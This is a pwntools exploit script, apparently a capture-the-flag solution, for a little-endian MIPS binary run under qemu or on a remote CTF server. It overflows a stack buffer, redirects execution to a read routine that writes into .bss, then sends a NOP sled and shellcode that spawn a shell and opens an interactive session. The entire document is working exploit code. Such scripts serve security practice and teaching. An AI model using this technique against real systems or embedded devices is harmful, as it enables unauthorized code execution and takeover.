from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",27635]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    # context.log_level="debug" 
    #io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    # io = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    io = process(["qemu-mipsel-static", "-g", "1234","-L",".","./pwn2"]) 
    # io = process("")
    context(arch='mips',endian='little', os='linux',bits='32')
    # context.terminal['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        context(arch='mips',endian='little', os='linux',bits='32')
        io = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')

shellcode=asm(shellcraft.sh())
bss_addr=0x410c00
read_text=0x4007e0

io.sendafter(b"name: \n",b"aaa")

# payload=cyclic(0x200)
#offset 36

# # NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
# for i in range(29):
#     payload += b"\x26\x40\x08\x01"

payload=cyclic(0x20)+p32(bss_addr)+p32(read_text)
io.sendafter(b"aaa",payload)

sleep(1)

payload=cyclic(0x24)+p32(bss_addr+0x40)+b"\x26\x40\x08\x01"*20+shellcode
io.send(payload)

io.interactive()